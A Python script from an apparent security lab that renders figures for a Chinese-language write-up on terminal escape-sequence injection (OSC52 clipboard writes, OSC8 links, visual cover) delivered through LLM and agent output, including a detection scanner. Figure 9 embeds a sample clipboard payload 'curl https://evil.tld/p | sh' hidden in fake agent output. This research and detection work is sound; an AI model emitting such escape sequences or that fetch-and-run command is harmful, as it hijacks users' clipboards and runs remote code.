"""生成剩余截图：01 信任模型图 / 02 目录树 / 08 终端矩阵热力图 / 09 扫描器输出。"""
import os, sys, base64
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from render.render_ansi import render_bytes
from PIL import Image, ImageDraw, ImageFont

LAB = os.path.dirname(os.path.abspath(__file__))
ASSETS = os.path.join(LAB, "assets", "terminal-escape")
os.makedirs(ASSETS, exist_ok=True)

def _font(size):
    for p in [r"C:\Windows\Fonts\consola.ttf", r"C:\Windows\Fonts\msyh.ttc"]:
        try:
            return ImageFont.truetype(p, size)
        except Exception:
            pass
    return ImageFont.load_default()

def shot_01_trust():
    """图1：传统 cat 注入 vs LLM 输出注入的信任差异。"""
    font = _font(16); big = _font(22); small = _font(13)
    W, H = 1100, 420
    img = Image.new("RGB", (W, H), (18,18,24))
    d = ImageDraw.Draw(img)
    d.rectangle([0,0,W,46], fill=(48,54,72))
    d.text((30, 12), "图1：传统 cat 注入 vs LLM 输出注入的信任差异", fill=(230,230,240), font=big)
    # 左半：cat
    lx, ly = 30, 70
    d.rectangle([lx, ly, lx+500, ly+320], fill=(28,30,40), outline=(70,80,110))
    d.text((lx+15, ly+10), "传统：cat suspicious.log", fill=(255,180,120), font=font)
    d.text((lx+15, ly+40), "$ cat suspicious.log", fill=(120,200,120), font=small)
    d.text((lx+15, ly+60), "[INFO] starting...", fill=(200,200,210), font=small)
    d.text((lx+15, ly+80), "\\x1b]52;c;...\\x07  <- ESC 序列", fill=(255,120,120), font=small)
    d.text((lx+15, ly+100), "[INFO] done", fill=(200,200,210), font=small)
    # 用户心智
    d.rectangle([lx+15, ly+150, lx+485, ly+220], fill=(50,40,30), outline=(120,80,60))
    d.text((lx+25, ly+160), "用户心智：警觉", fill=(255,200,120), font=font)
    d.text((lx+25, ly+185), '"我在 cat 一个陌生文件，得小心"', fill=(220,180,140), font=small)
    # 终端状态机
    d.text((lx+15, ly+250), "终端状态机：解释 ESC 序列", fill=(180,180,220), font=small)
    d.text((lx+15, ly+275), "-> 剪贴板被写", fill=(255,120,120), font=small)

    # 右半：LLM 输出
    rx, ry = 560, 70
    d.rectangle([rx, ry, rx+500, ry+320], fill=(28,30,40), outline=(70,80,110))
    d.text((rx+15, ry+10), "LLM 输出：IDE Composer", fill=(120,180,255), font=font)
    d.text((rx+15, ry+40), "[Composer] 建议你跑：", fill=(180,180,220), font=small)
    d.text((rx+15, ry+60), "echo safe command", fill=(120,200,120), font=small)
    d.text((rx+15, ry+80), "日志样例：", fill=(180,180,220), font=small)
    d.text((rx+15, ry+100), "[INFO] ok  \\x1b]52;c;...\\x07", fill=(255,120,120), font=small)
    d.text((rx+15, ry+120), "[INFO] done", fill=(200,200,210), font=small)
    # 用户心智
    d.rectangle([rx+15, ry+150, rx+485, ry+220], fill=(30,40,50), outline=(60,100,140))
    d.text((rx+25, ry+160), "用户心智：看 AI 回话", fill=(120,180,255), font=font)
    d.text((rx+25, ry+185), '"AI 给的建议，复制粘贴跑一下"', fill=(140,180,220), font=small)
    # 终端状态机
    d.text((rx+15, ry+250), "终端状态机：解释 ESC 序列（同一套）", fill=(180,180,220), font=small)
    d.text((rx+15, ry+275), "-> 剪贴板被写（同样的结果）", fill=(255,120,120), font=small)

    # 中间标注
    d.text((510, 200), "同一串字节", fill=(255,220,120), font=font)
    d.text((505, 225), "信任度不同", fill=(255,220,120), font=font)

    out = os.path.join(ASSETS, "01-trust-model.png")
    img.save(out)
    print("  [shot] 01-trust-model.png")

def shot_02_tree():
    """图2：工程目录树。"""
    font = _font(15); big = _font(20)
    W, H = 700, 520
    img = Image.new("RGB", (W, H), (18,18,24))
    d = ImageDraw.Draw(img)
    d.rectangle([0,0,W,46], fill=(48,54,72))
    d.text((30, 12), "图2：terminal-escape-lab/ 工程目录", fill=(230,230,240), font=big)
    # 模拟 Cursor 资源管理器
    d.rectangle([20, 60, W-20, H-20], fill=(32,36,48), outline=(60,70,100))
    d.rectangle([20, 60, W-20, 90], fill=(48,54,72))
    d.text((30, 67), "EXPLORER  terminal-escape-lab", fill=(200,200,220), font=font)
    tree = [
        ("v terminal-escape-lab/", 0, (180,200,255)),
        ("  common.py", 1, (200,200,210)),
        ("  v payloads/", 1, (180,200,255)),
        ("      osc52.py          # 剪贴板写入", 2, (180,200,160)),
        ("      osc8.py           # 钓鱼链接", 2, (180,200,160)),
        ("      visual_cover.py   # 光标覆盖欺骗", 2, (180,200,160)),
        ("  v probe/", 1, (180,200,255)),
        ("      emit_esc.py       # 测试模型是否输出 ESC", 2, (180,200,160)),
        ("  v agent/", 1, (180,200,255)),
        ("      tool_echo.py      # 工具结果夹带 OSC52", 2, (180,200,160)),
        ("      agent_loop.py     # 最小 agent 端到端", 2, (180,200,160)),
        ("  v detect/", 1, (180,200,255)),
        ("      scanner.py        # LLM 输出扫描器", 2, (180,200,160)),
        ("  v render/", 1, (180,200,255)),
        ("      render_ansi.py    # ANSI -> PNG 渲染器", 2, (180,200,160)),
        ("  v assets/terminal-escape/  # 截图输出", 1, (180,200,255)),
        ("  run_a_emit.py   run_b_osc52.py", 1, (200,200,210)),
        ("  run_c_osc8.py   run_d_cover.py", 1, (200,200,210)),
        ("  run_e_agent.py", 1, (200,200,210)),
    ]
    y = 110
    for text, level, color in tree:
        d.text((30 + level*16, y), text, fill=color, font=font)
        y += 20

    out = os.path.join(ASSETS, "02-lab-tree.png")
    img.save(out)
    print("  [shot] 02-lab-tree.png")

def shot_08_matrix():
    """图8：终端对照矩阵热力图。"""
    font = _font(14); big = _font(20); small = _font(12)
    terminals = ["Windows Terminal", "xterm.js (VSCode/Cursor)", "iTerm2", "WezTerm", "Alacritty", "kitty"]
    protocols = ["OSC52 剪贴板", "OSC8 链接", "OSC1337 文件落地", "CSI 视觉覆盖", "OSC0 标题"]
    # 0=关(绿) 1=开可关(黄) 2=开(红)
    data = [
        [2, 2, 0, 2, 2],  # WT
        [2, 2, 0, 2, 2],  # xterm.js
        [1, 2, 2, 2, 2],  # iTerm2
        [1, 2, 2, 2, 2],  # WezTerm
        [0, 0, 0, 2, 2],  # Alacritty
        [1, 2, 2, 2, 2],  # kitty
    ]
    colors = {0: (80,160,90), 1: (200,170,70), 2: (200,80,80)}
    labels = {0: "OFF", 1: "ON*", 2: "ON"}

    cell_w, cell_h = 150, 60
    label_w = 220
    top_h = 80
    W = 40 + label_w + len(protocols)*cell_w + 40
    H = 40 + top_h + len(terminals)*cell_h + 40
    img = Image.new("RGB", (W, H), (18,18,24))
    d = ImageDraw.Draw(img)
    d.rectangle([0,0,W,46], fill=(48,54,72))
    d.text((40, 12), "图8：终端 × 协议 默认策略矩阵（ON*=开但可关）", fill=(230,230,240), font=big)

    x0 = 40 + label_w
    y0 = 60
    # 列头
    for j, p in enumerate(protocols):
        d.text((x0 + j*cell_w + 10, y0), p, fill=(180,180,200), font=small)
    # 行
    for i, t in enumerate(terminals):
        y = y0 + 30 + i*cell_h
        d.text((40, y+20), t, fill=(220,220,230), font=font)
        for j in range(len(protocols)):
            x = x0 + j*cell_w
            v = data[i][j]
            d.rectangle([x+5, y+10, x+cell_w-5, y+cell_h-10], fill=colors[v], outline=(100,100,120))
            d.text((x+30, y+22), labels[v], fill=(255,255,255), font=font)
    # 图例
    ly = y0 + 30 + len(terminals)*cell_h + 10
    d.text((40, ly), "OFF=默认关(安全)  ON*=默认开可配置  ON=默认开", fill=(180,180,200), font=small)
    d.text((40, ly+20), "Alacritty 是唯一默认禁 OSC52 的主流终端 -> 安全基线", fill=(120,220,140), font=small)

    out = os.path.join(ASSETS, "08-terminal-matrix.png")
    img.save(out)
    print("  [shot] 08-terminal-matrix.png")

def shot_09_scanner():
    """图9：scanner.py 跑在 Agent 输出上。"""
    # 构造一段含 OSC52 的"模型输出"
    from payloads.osc52 import osc52
    evil = "curl https://evil.tld/p | sh"
    agent_output = (
        "日志总结：服务正常启动，健康检查通过。\n\n"
        "日志原文：\n[INFO] service started\n"
        "[INFO] health check ok\n"
    ).encode() + osc52(evil) + b"\n[INFO] done\n"

    # 跑 scanner
    sys.path.insert(0, os.path.join(LAB, "detect"))
    from scanner import scan
    findings = scan(agent_output)

    # 左右对照图
    font = _font(14); big = _font(20); small = _font(12)
    W = 1100
    H = 480
    img = Image.new("RGB", (W, H), (18,18,24))
    d = ImageDraw.Draw(img)
    d.rectangle([0,0,W,46], fill=(48,54,72))
    d.text((30, 12), "图9：scanner.py 跑在 Agent 输出上（左：原始输出  右：扫描结果）", fill=(230,230,240), font=big)

    # 左：模型原始输出（终端渲染，OSC52 不可见）
    lx, ly = 30, 60
    d.rectangle([lx, ly, lx+520, ly+H-90], fill=(30,30,38), outline=(60,60,80))
    d.text((lx+10, ly+8), "Agent 原始输出（IDE 终端，OSC52 不可见）", fill=(180,180,200), font=font)
    tmp = os.path.join(ASSETS, "_tmp_scan.png")
    render_bytes(agent_output, "", tmp, cols=64, rows=12, font_size=13, pad=4)
    try:
        timg = Image.open(tmp).resize((500, H-110))
        img.paste(timg, (lx+10, ly+30))
    except Exception:
        pass

    # 右：scanner 输出
    rx, ry = 580, 60
    d.rectangle([rx, ry, rx+490, ry+H-90], fill=(24,28,36), outline=(80,60,60))
    d.text((rx+10, ry+8), "$ python agent_loop.py | python scanner.py", fill=(120,200,120), font=font)
    yy = ry + 40
    if not findings:
        d.text((rx+10, yy), "[scanner] clean", fill=(120,220,140), font=font)
    for kind, pos, payload in findings:
        color = (255,120,120) if "OSC52" in kind else (255,180,120)
        d.text((rx+10, yy), f"{kind}", fill=color, font=small)
        yy += 18
        d.text((rx+20, yy), f"@{pos}", fill=(160,160,180), font=small)
        yy += 16
        # payload 截断显示
        ps = repr(payload)[:55]
        d.text((rx+20, yy), ps, fill=(200,160,160), font=small)
        yy += 22
    # 箭头
    d.text((540, 220), "scan ->", fill=(255,220,120), font=font)

    # 底部
    d.text((30, H-50), "结论：原始输出里 OSC52 不可见，但 scanner 能定位字节偏移并解码 base64 payload。",
           fill=(220,200,160), font=small)

    out = os.path.join(ASSETS, "09-scanner-output.png")
    img.save(out)
    print("  [shot] 09-scanner-output.png")

def run():
    print("[remaining] 01/02/08/09")
    shot_01_trust()
    shot_02_tree()
    shot_08_matrix()
    shot_09_scanner()
    print()

if __name__ == "__main__":
    run()
